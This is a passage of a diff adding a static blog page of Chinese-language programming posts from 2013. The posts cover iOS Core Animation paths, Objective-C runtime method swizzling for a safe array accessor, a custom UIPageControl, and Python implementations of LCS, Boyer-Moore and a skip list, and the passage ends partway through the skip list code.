+    <span class="n">CGPathAddArc</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mf">0.0f</span><span class="p">,</span> <span class="mf">200.0f</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.8424</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.9424</span><span class="p">,</span> <span class="nb">YES</span><span class="p">);</span>
+    <span class="n">CAKeyframeAnimation</span> <span class="o">*</span><span class="n">animation</span><span class="o">=</span><span class="p">[</span><span class="n">CAKeyframeAnimation</span> <span class="n">animationWithKeyPath</span><span class="o">:</span><span class="s">@&quot;position&quot;</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setCalculationMode</span><span class="o">:</span><span class="n">kCAAnimationPaced</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setPath</span><span class="o">:</span><span class="n">path</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setDuration</span><span class="o">:</span><span class="mf">2.0f</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setTimingFunction</span><span class="o">:</span><span class="p">[</span><span class="n">CAMediaTimingFunction</span> <span class="n">functionWithName</span><span class="o">:</span><span class="n">kCAMediaTimingFunctionEaseInEaseOut</span><span class="p">]];</span>
+<span class="c1">//    [animation setBeginTime:CACurrentMediaTime()+0.7];</span>
+<span class="c1">//    [animation setRepeatCount:HUGE_VALF];</span>
+    <span class="n">CFRelease</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
+    <span class="n">CAAnimationGroup</span> <span class="o">*</span><span class="n">animationGroup</span> <span class="o">=</span> <span class="p">[</span><span class="n">CAAnimationGroup</span> <span class="n">animation</span><span class="p">];</span><span class="c1">//利用动画组的间隔做到小动画的无限间隔之间的停顿</span>
+    <span class="n">animationGroup</span><span class="p">.</span><span class="n">duration</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+    <span class="n">animationGroup</span><span class="p">.</span><span class="n">repeatCount</span> <span class="o">=</span> <span class="n">INFINITY</span><span class="p">;</span>
+    <span class="n">animationGroup</span><span class="p">.</span><span class="n">animations</span><span class="o">=</span><span class="p">@[</span><span class="n">animation</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">animationGroup</span> <span class="n">setBeginTime</span><span class="o">:</span><span class="n">CACurrentMediaTime</span><span class="p">()</span><span class="o">+</span><span class="mf">0.5</span><span class="p">];</span><span class="c1">//让三个元素起始时间区分开</span>
+    <span class="p">[</span><span class="n">red</span><span class="p">.</span><span class="n">layer</span> <span class="n">addAnimation</span><span class="o">:</span><span class="n">animationGroup</span> <span class="n">forKey</span><span class="o">:</span><span class="nb">NULL</span><span class="p">];</span>
+    <span class="n">path</span><span class="o">=</span><span class="n">CGPathCreateMutable</span><span class="p">();</span>
+    <span class="n">CGPathAddArc</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mf">0.0f</span><span class="p">,</span> <span class="mf">200.0f</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.683</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.683</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">PI</span><span class="p">,</span> <span class="nb">NO</span><span class="p">);</span>
+    <span class="n">CGPathAddArc</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mf">0.0f</span><span class="p">,</span> <span class="mf">200.0f</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.683</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.783</span><span class="p">,</span> <span class="nb">YES</span><span class="p">);</span>
+    <span class="n">animation</span><span class="o">=</span><span class="p">[</span><span class="n">CAKeyframeAnimation</span> <span class="n">animationWithKeyPath</span><span class="o">:</span><span class="s">@&quot;position&quot;</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setCalculationMode</span><span class="o">:</span><span class="n">kCAAnimationPaced</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setPath</span><span class="o">:</span><span class="n">path</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setDuration</span><span class="o">:</span><span class="mf">2.0f</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setTimingFunction</span><span class="o">:</span><span class="p">[</span><span class="n">CAMediaTimingFunction</span> <span class="n">functionWithName</span><span class="o">:</span><span class="n">kCAMediaTimingFunctionEaseInEaseOut</span><span class="p">]];</span>
+<span class="c1">//    [animation setBeginTime:CACurrentMediaTime()+0.5];</span>
+<span class="c1">//    [animation setRepeatCount:HUGE_VALF];</span>
+
+    <span class="n">CFRelease</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
+    <span class="n">animationGroup</span> <span class="o">=</span> <span class="p">[</span><span class="n">CAAnimationGroup</span> <span class="n">animation</span><span class="p">];</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="n">animationGroup</span><span class="p">.</span><span class="n">duration</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="n">animationGroup</span><span class="p">.</span><span class="n">repeatCount</span> <span class="o">=</span> <span class="n">INFINITY</span><span class="p">;</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="n">animationGroup</span><span class="p">.</span><span class="n">animations</span><span class="o">=</span><span class="p">@[</span><span class="n">animation</span><span class="p">];</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="p">[</span><span class="n">animationGroup</span> <span class="n">setBeginTime</span><span class="o">:</span><span class="n">CACurrentMediaTime</span><span class="p">()</span><span class="o">+</span><span class="mf">0.2</span><span class="p">];</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="p">[</span><span class="n">green</span><span class="p">.</span><span class="n">layer</span> <span class="n">addAnimation</span><span class="o">:</span><span class="n">animationGroup</span> <span class="n">forKey</span><span class="o">:</span><span class="nb">NULL</span><span class="p">];</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="n">path</span><span class="o">=</span><span class="n">CGPathCreateMutable</span><span class="p">();</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="n">CGPathAddArc</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mf">0.0f</span><span class="p">,</span> <span class="mf">200.0f</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.425</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.425</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">PI</span><span class="p">,</span> <span class="nb">NO</span><span class="p">);</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="n">CGPathAddArc</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mf">0.0f</span><span class="p">,</span> <span class="mf">200.0f</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.425</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.525</span><span class="p">,</span> <span class="nb">YES</span><span class="p">);</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="n">animation</span><span class="o">=</span><span class="p">[</span><span class="n">CAKeyframeAnimation</span> <span class="n">animationWithKeyPath</span><span class="o">:</span><span class="s">@&quot;position&quot;</span><span class="p">];</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setCalculationMode</span><span class="o">:</span><span class="n">kCAAnimationPaced</span><span class="p">];</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setPath</span><span class="o">:</span><span class="n">path</span><span class="p">];</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setDuration</span><span class="o">:</span><span class="mf">2.0f</span><span class="p">];</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+<span class="c1">//    [animation setRepeatCount:HUGE_VALF];&lt;/p&gt;</span>
+
+    <span class="p">[</span><span class="n">animation</span> <span class="n">setTimingFunction</span><span class="o">:</span><span class="p">[</span><span class="n">CAMediaTimingFunction</span> <span class="n">functionWithName</span><span class="o">:</span><span class="n">kCAMediaTimingFunctionEaseInEaseOut</span><span class="p">]];</span>
+
+    <span class="n">CFRelease</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
+    <span class="n">animationGroup</span> <span class="o">=</span> <span class="p">[</span><span class="n">CAAnimationGroup</span> <span class="n">animation</span><span class="p">];</span>
+    <span class="n">animationGroup</span><span class="p">.</span><span class="n">duration</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+    <span class="n">animationGroup</span><span class="p">.</span><span class="n">repeatCount</span> <span class="o">=</span> <span class="n">INFINITY</span><span class="p">;</span>
+    <span class="n">animationGroup</span><span class="p">.</span><span class="n">animations</span><span class="o">=</span><span class="p">@[</span><span class="n">animation</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">yellow</span><span class="p">.</span><span class="n">layer</span> <span class="n">addAnimation</span><span class="o">:</span><span class="n">animationGroup</span> <span class="n">forKey</span><span class="o">:</span><span class="nb">NULL</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="c1">// Only override drawRect: if you perform custom drawing.</span>
+<span class="c1">// An empty implementation adversely affects performance during animation.</span>
+<span class="k">-</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">drawRect:</span><span class="p">(</span><span class="n">CGRect</span><span class="p">)</span><span class="nv">rect</span>
+<span class="p">{</span>
+    <span class="n">CGContextRef</span> <span class="n">context</span> <span class="o">=</span> <span class="n">UIGraphicsGetCurrentContext</span><span class="p">();</span>
+    <span class="n">CGContextSetStrokeColor</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="p">[</span><span class="n">UIColor</span> <span class="n">blueColor</span><span class="p">].</span><span class="n">CGColor</span><span class="p">);</span>
+    <span class="n">CGContextAddArc</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="mf">0.0</span><span class="p">,</span> <span class="mf">200.0f</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="o">*</span><span class="n">PI</span><span class="p">,</span> <span class="nb">YES</span><span class="p">);</span>
+
+    <span class="p">[[</span><span class="n">UIColor</span> <span class="n">orangeColor</span><span class="p">]</span> <span class="n">setFill</span><span class="p">];</span>
+    <span class="p">[[</span><span class="n">UIColor</span> <span class="n">blueColor</span><span class="p">]</span> <span class="n">setStroke</span><span class="p">];</span>
+    <span class="n">CGContextDrawPath</span> <span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">kCGPathStroke</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">@end</span>
+</code></pre></div>
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/07/29/ios%E6%9B%BF%E6%8D%A2%E7%B3%BB%E7%BB%9F%E6%96%B9%E6%B3%95">ios替换系统方法 </a></h3>
+  <div class="date">
+    <span>29 July 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>作为动态语言的oc我以前一直忽视了他的动态特性最近一个分享会才突然就有种飘逸的感觉<br />
+主要使用的就是oc的runtime特性<br />
+#import "objc/runtime.h"<br />
+引入这个头文件之后才发现动态远远不止我以前想的那么简单引入这个头文件后可以发现者真是海量的api能让代码写的真是自己都不认识都不过分<br />
+然后就写一个例子来试验了<br />
+比如 NSArray 里面的objetAtIndex 方法我想这个方法真是被无数人深恶痛绝……多少crash都是从这里搞出来的啊那么其实通过runtime完全可以重写这个方法、当然绝对不仅仅是简单的给他封一层那么简单<br />
+首先你先需要找到这个方法是在哪儿的、最简单的方法就是故意越界让他报次错看看嘛Terminating app due to uncaught exception 'NSRangeException', reason: '*** -[__NSArrayI objectAtIndex:]<br />
+看到了吧就是 _NSArrayI里<br />
+然后需要做的就是很简单了
+<pre lang="objective-c">
+Method method_ObjectAtIndex = class_getInstanceMethod(NSClassFromString(@"__NSArrayI"),@selector(objectAtIndex:));
+Method method_SafeObjectAtIndex = class_getInstanceMethod(NSClassFromString(@"NSArray"),@selector(safeObjectAtIndex:));//这个方法就是一会自己写的拓展进nsarray中的
+method_exchangeImplementations(method_ObjectAtIndex, method_SafeObjectAtIndex);//然后交换就是这么简单 不过这个危险性也是极大的比如整个系统所有的调用这个原生api的调用就全都走到你这来了、必须必须要确保正确性……</pre></p>
+
+<p>//然后就简单的加个category的实现就好了<br />
+@implementation NSArray(SafeExtenstion)<br />
+- (id)safeObjectAtIndex:(NSUInteger)index<br />
+{
+    NSLog(@"wake %@--%@",NSStringFromSelector(_cmd),self);<br />
+    if (self.count <= index) return nil;<br />
+    return [self safeObjectAtIndex:index];<br />
+}
+@end
+
+这样就可以自己去复写掉一些认为系统实现的很傻逼的方法了吧、runtime的适用场景我想还远远不止这些呢</p>
 
     </div>
 
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/06/24/%E5%AE%9A%E5%88%B6-uipagecontrol">定制 UIPageControl </a></h3>
+  <div class="date">
+    <span>24 June 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>pagecontrol 就是iphone上面比如scrollview翻图片时候下面那个小点点<br />
+其实我个人觉得还是挺美观的……可是需求就是要自己的图片替掉……然后死人苹果又不给api、所以也就只能自己复写实现了<br />
+先说下ios7之前 那些点点的实现非常简单 就是UIPageControl.subviews 就是一个个点的UIImageView 所以只需简单的替换掉就好了代码如下
+<pre lang="c">
+@property(nonatomic,strong)UIImage *_activeImage;
+@property(nonatomic,strong)UIImage *_inactiveImage;
+//在init的时候把你自己定义的两张图片搞进去
+- (void)updateDots
+{
+    for (int i = 0; i< [self.subviews count]; i++) {
+        UIImageView* dot =[self.subviews objectAtIndex:i];</pre></p>
+
+<p>        if (i == self.currentPage) {<br />
+            if ([dot respondsToSelector:@selector(setImage:)]) {<br />
+                dot.image=_activeImage;<br />
+            }</p>
+
+<p>        } else {<br />
+            if ([dot respondsToSelector:@selector(setImage:)]) {<br />
+                dot.image=_inactiveImage;<br />
+            }<br />
+        }<br />
+    }<br />
+}
+//然后自己重载一下setNumber就好了</p>
+
+<p>- (void)setNumberOfPages:(NSInteger)numberOfPages<br />
+{
+    [super setNumberOfPages:numberOfPages];<br />
+    [self updateDots];<br />
+}
+
+但是呢万恶的ios7改掉了尼玛……连底层实现都改啊混蛋……可以对self.subviews 标红一下就明白了……整个pagecontrol的uivew乱七八糟……而且都是view根本就没了image属性、换句话说现在的那些小点点都是代码写出来的了、而不是简单图了<br />
+实现起来就要重写UIView的绘画函数了代码大致如下
+<pre lang="c">
+#import "ZDPageControll.h"
+#import <QuartzCore/QuartzCore.h></pre></p>
+
+<p>@interface ZDPageControll()<br />
+{
+    UIImage *_activeImage;<br />
+    UIImage *_inactiveImage;<br />
+    NSArray *_usedToRetainOriginalSubview;<br />
+}</p>
+
+<p>@end</p>
+
+<p>@implementation ZDPageControll<br />
+@synthesize kSpacing=_kSpacing;<br />
+- (id)initWithFrame:(CGRect)frame currentImageName:(NSString *)current commonImageName:(NSString *)common<br />
+{
+    self= [super initWithFrame:frame];<br />
+    if ([self respondsToSelector:@selector(setCurrentPageIndicatorTintColor:)] && [self respondsToSelector:@selector(setPageIndicatorTintColor:)]) {<br />
+        [self setCurrentPageIndicatorTintColor:[UIColor clearColor]];<br />
+        [self setPageIndicatorTintColor:[UIColor clearColor]];<br />
+    }<br />
+    <br />
+    [self setBackgroundColor:[UIColor clearColor]];<br />
+    _activeImage= [UIImage imageNamed:current];<br />
+    _inactiveImage= [UIImage imageNamed:common];<br />
+    _kSpacing=10.0f;<br />
+    //hold住原来pagecontroll的subview<br />
+    _usedToRetainOriginalSubview=[NSArray arrayWithArray:self.subviews];<br />
+    for (UIView *su in self.subviews) {<br />
+        [su removeFromSuperview];<br />
+    }<br />
+    self.contentMode=UIViewContentModeRedraw;<br />
+    return self;<br />
+}
+-(void)dealloc<br />
+{
+    //释放原来hold住的那些subview<br />
+    _usedToRetainOriginalSubview=nil;<br />
+    _activeImage=nil;<br />
+    _inactiveImage=nil;<br />
+}
+- (void)updateDots<br />
+{</p>
+
+<p>    for (int i = 0; i< [self.subviews count]; i++) {<br />
+        UIImageView* dot =[self.subviews objectAtIndex:i];</p>
+
+<p>        if (i == self.currentPage) {<br />
+            if ([dot respondsToSelector:@selector(setImage:)]) {<br />
+                dot.image=_activeImage;<br />
+            }</p>
+
+<p>        } else {<br />
+            if ([dot respondsToSelector:@selector(setImage:)]) {<br />
+                dot.image=_inactiveImage;<br />
+            }<br />
+        }<br />
+    }</p>
+
+<p>}</p>
+
+<p>- (void)setCurrentPage:(NSInteger)currentPage<br />
+{
+    [super setCurrentPage:currentPage];<br />
+    if ([[[UIDevice currentDevice]systemVersion]floatValue] <=6.0) {<br />
+        [self updateDots];<br />
+    }<br />
+//    [self updateDots];<br />
+    [self setNeedsDisplay];<br />
+}
+- (void)setNumberOfPages:(NSInteger)numberOfPages<br />
+{
+    [super setNumberOfPages:numberOfPages];<br />
+    if ([[[UIDevice currentDevice]systemVersion]floatValue] <=6.0) {<br />
+        [self updateDots];<br />
+    }<br />
+//    [self updateDots];<br />
+    [self setNeedsDisplay];</p>
+
+<p>}<br />
+-(void)drawRect:(CGRect)iRect<br />
+{
+    int i;<br />
+    CGRect rect;<br />
+    <br />
+    UIImage *image;<br />
+    iRect = self.bounds;<br />
+    <br />
+    if ( self.opaque ) {<br />
+        [self.backgroundColor set];<br />
+        UIRectFill( iRect );<br />
+    }<br />
+    <br />
+    if ( self.hidesForSinglePage && self.numberOfPages == 1 ) return;<br />
+    <br />
+    rect.size.height = _activeImage.size.height;<br />
+    rect.size.width = self.numberOfPages * _activeImage.size.width + ( self.numberOfPages - 1 ) * _kSpacing;<br />
+    rect.origin.x = floorf( ( iRect.size.width - rect.size.width ) / 2.0 );<br />
+    rect.origin.y = floorf( ( iRect.size.height - rect.size.height ) / 2.0 );<br />
+    rect.size.width = _activeImage.size.width;<br />
+    <br />
+    for ( i = 0; i < self.numberOfPages; ++i ) {<br />
+        image = i == self.currentPage ? _activeImage : _inactiveImage;<br />
+        <br />
+        [image drawInRect: rect];<br />
+        <br />
+        rect.origin.x += _activeImage.size.width + _kSpacing;<br />
+    }<br />
+}
+@end</p>
+
+<p></p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/05/08/%E6%9C%80%E5%A4%A7%E5%85%AC%E5%85%B1%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97lcs-python%E5%AE%9E%E7%8E%B0">最大公共上升子序列(lcs) python实现 </a></h3>
+  <div class="date">
+    <span>08 May 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>mit 算法导论公开课 15集<br />
+http://v.163.com/movie/2010/12/L/4/M6UTT5U0I_M6V2U1HL4.html</p>
+
+<p>实现了求出所有的lcs
+<pre lang="python">
+import copy
+import sys
+#stringa="abcbdab"
+#stringb="bdcaba"</pre></p>
+
+<p>stringa=sys.argv[1]<br />
+stringb=sys.argv[2]<br />
+lena=len(stringa)<br />
+lenb=len(stringb)</p>
+
+<p>mapl=[[0 for _ in xrange(lena+1)] for _ in xrange(lenb+1)]<br />
+path=[]<br />
+for i in xrange(1,lenb+1):<br />
+	for j in xrange(1,lena+1):<br />
+		if stringa[j-1]==stringb[i-1]:<br />
+			mapl[i][j]=mapl[i-1][j-1]+1<br />
+			path.append((i,j))<br />
+		else:<br />
+			mapl[i][j]=max(mapl[i-1][j],mapl[i][j-1])<br />
+#for i in mapl:<br />
+#	print i<br />
+#print path<br />
+if len(path)==0:<br />
+	print "no lcs"<br />
+else:<br />
+	backdatestack=[[(lenb,lena),[]]]<br />
+	while len(backdatestack)!=0:<br />
+		top=backdatestack.pop()<br />
+		ansstack=top[1]<br />
+		lcs=mapl[top[0][0]][top[0][1]]<br />
+		i=top[0][0]<br />
+		j=top[0][1]<br />
+		while lcs!=0:<br />
+			try:<br />
+				ind=path.index((i,j))<br />
+				ansstack.append(stringb[i-1])<br />
+				i-=1<br />
+				j-=1<br />
+				lcs-=1<br />
+			except ValueError:<br />
+				if mapl[i-1][j]>mapl[i][j-1]:<br />
+					i-=1<br />
+				elif mapl[i-1][j]<mapl[i][j-1]:<br />
+					j-=1<br />
+				else:<br />
+					backdatestack.append([(i-1,j),copy.copy(ansstack)])<br />
+					j-=1<br />
+		while len(ansstack)!=0:<br />
+			print ansstack.pop(),<br />
+		print </p>
+
+<p></p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/05/06/boyer-moore%E7%AE%97%E6%B3%95-python%E5%AE%9E%E7%8E%B0">Boyer-Moore算法 python实现 </a></h3>
+  <div class="date">
+    <span>06 May 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>看了<a href="http://www.ruanyifeng.com/blog/2013/05/boyer-moore_string_search_algorithm.html?utm_source=feedly">字符串匹配的Boyer-Moore算法</a>后觉得很有用就写一个实现了一下
+<pre lang="python">
+def badcharrule(ori,sear):
+	if len(ori)!=len(sear):
+		print "error"
+	else:
+		le=len(ori)
+		badindex=-1
+		lastindex=-1
+		for i in xrange(le-1,0,-1):
+			if ori[i]==sear[i]:
+				pass
+			else:
+				badindex=i
+				break
+		if badindex==-1:
+			pass
+		else:
+			for i in xrange(0,le):
+				if sear[i]==ori[badindex]:
+					lastindex=i
+					break
+				else:
+					pass
+		return badindex-lastindex
+def goodpostfixrule(ori,sear):
+	if len(ori)!=len(sear):
+		print "error"
+	else:
+		le=len(ori)
+		postfix=0
+		for i in xrange(le-1,0,-1):
+			if ori[i]==sear[i]:
+				postfix+=1
+			else:
+				break
+		if postfix==0:
+			return -1
+		else:
+			postfixstring=sear[-postfix:]
+			restori=sear[:-postfix]
+			if restori.find(postfixstring)==-1:
+				restori=postfixstring[:-1]+restori
+				if restori.find(postfixstring)==-1:
+					return -1
+				else:
+					return len(sear)-restori.find(postfixstring)-1
+			else:
+				return len(sear)-restori.find(postfixstring)-len(postfixstring)</pre></p>
+
+<p>def movestep(ori,sear):<br />
+	gu=badcharrule(ori,sear)<br />
+	if gu==0:<br />
+		return 0<br />
+	else:<br />
+		return max(gu,goodpostfixrule(ori,sear))</p>
+
+<p>oristring="here is a simple example"<br />
+searchstring="example"</p>
+
+<p>index=0<br />
+while index+len(searchstring)<=len(oristring):<br />
+	move=movestep(oristring[index:index+len(searchstring)],searchstring)<br />
+	if move==0:<br />
+		print "find it index=%s" %index<br />
+		index+=len(searchstring)<br />
+	else:<br />
+		index+=move<br />
+print "search over"
+</p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/05/05/%E8%B7%B3%E8%A1%A8python%E5%AE%9E%E7%8E%B0">跳表python实现 </a></h3>
+  <div class="date">
+    <span>05 May 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>最近在看算法导论发现跳表好像一直没实现过……所以闲来无视就写了个python的实现<br />
+详细介绍可看网易公开课算法导论第12集跳跃表<br />
+http://v.163.com/special/opencourse/algorithms.html</p>
+
+<p>然后把代码贴上
+<pre lang="python">import sys
+import random
+mineast=-sys.maxint
+class Node(object):
+	def __init__(self,value=mineast,rightp=None,leftp=None,upp=None,downp=None):
+		self.value=value
+		self.rightp=rightp
+		self.leftp=leftp
+		self.upp=upp
+		self.downp=downp
+	def __del__(self):
+		self.value=None
+		self.rightp=None
+		self.leftp=None
+		self.upp=None
+		self.downp=None
+class skipTable(object):
+	def __init__(self):
+		self.lefthead=Node()
+	def __del__(self):
+		t=self.lefthead
+		headlist=[]
+		while t:
+			headlist.append(t)
+			t=t.downp
+		for i in headlist:
+			while i:
+				dd=i
+				i=i.rightp
+				del(dd)</pre></p>
+
+<p>	def findlowestLayer(self,newvalue):<br />
+		tmphead=self.lefthead<br />
+		tmpans=[]<br />
+		while tmphead.downp:<br />
+			while tmphead.rightp:<br />
+				if tmphead.rightp.value&gt;newvalue:<br />
+					break<br />
+				else:<br />
+					tmphead=tmphead.rightp<br />
+			tmpans.append(tmphead)<br />
+			tmphead=tmphead.downp<br />
+		tmpans.append(tmphead)<br />
+		return tmpans<br />
+	def getCurrentLayerInsertLoc(self,Head,newvalue):<br />
+		tmphead=Head<br />
+		while(tmphead.rightp):<br />
+			if tmphead.rightp.value&gt;newvalue:<br />
+				return tmphead<br />
+			else:<br />
+				tmphead=tmphead.rightp<br />
+		return tmphead<br />
+	def randomup(self):<br />
+		if random.randint(0,1)==0:<br />
+			return False<br />
+		else:<br />
+			return True<br />
+	def adjustnode(self,prefixNode,value):<br />
+		newnode=Node(value,prefixNode.rightp,prefixNode,None,None)<br />
+		if prefixNode.rightp:<br />
+			prefixNode.rightp.leftp=newnode<br />
+			prefixNode.rightp=newnode<br />
+		else:<br />
+			prefixNode.rightp=newnode<br />
+		return newnode<br />
+	def adjustnodepor(self,prefixNode,downNode,value):<br />
+		newnode=Node(value,prefixNode.rightp,prefixNode,None,downNode)<br />
+		downNode.upp=newnode<br />
+		if prefixNode.rightp:<br />
+			prefixNode.rightp.leftp=newnode<br />
+			prefixNode.rightp=newnode<br />
+		else:<br />
+			prefixNode.rightp=newnode<br />
+		return newnode<br />
+	def insert(self,value):<br />
+		lowestlayerNode=self.findlowestLayer(value)<br />
+		loc=self.getCurrentLayerInsertLoc(lowestlayerNode.pop(),value)<br />
+		downNode=self.adjustnode(loc,value)<br />
+		while self.randomup():<br />
+			#print "up %s" %value<br />
+			if(len(lowestlayerNode)!=0):<br />
+				downNode=self.adjustnodepor(lowestlayerNode.pop(),downNode,value)<br />
+			else:<br />
+				newnode=Node()<br />
+				newnode.downp=self.lefthead<br />
+				self.lefthead.upp=newnode<br />
+				self.lefthead=newnode<br />
+				downNode=self.adjustnodepor(newnode,downNode,value)<br />
+	def delete(self,value):<br />
+		lowestlayerNode=self.findlowestLayer(value)<br />
+		loc=self.getCurrentLayerInsertLoc(lowestlayerNode.pop(),value)<br />
+		lowestlayerNode.append(loc)<br />
+		for i in lowestlayerNode:<br />
+			if i.value==value:<br />
+				if i.rightp:<br />
+					i.leftp.rightp=i.rightp<br />
+					i.rightp.leftp=i.leftp<br />
+					del(i)<br />
+				else:<br />
+					i.leftp.rightp=None<br />
+					del(i)<br />
+	def find(self,value):<br />
+		tmphead=self.lefthead<br />
+		while tmphead.downp:<br />
+			while tmphead.rightp:<br />
+				if tmphead.rightp.value&gt;value:<br />
+					break<br />
+				elif tmphead.rightp.value==value:<br />
+					print "find"<br />
+					return<br />
+				else:<br />
+					tmphead=tmphead.rightp<br />
+			tmphead=tmphead.downp<br />
+		while tmphead.rightp:<br />
+			if tmphead.rightp.value==value:<br />
+				print "find"<br />
+				return<br />
+			tmphead=tmphead.rightp<br />
+		if tmphead.value==value:<br />
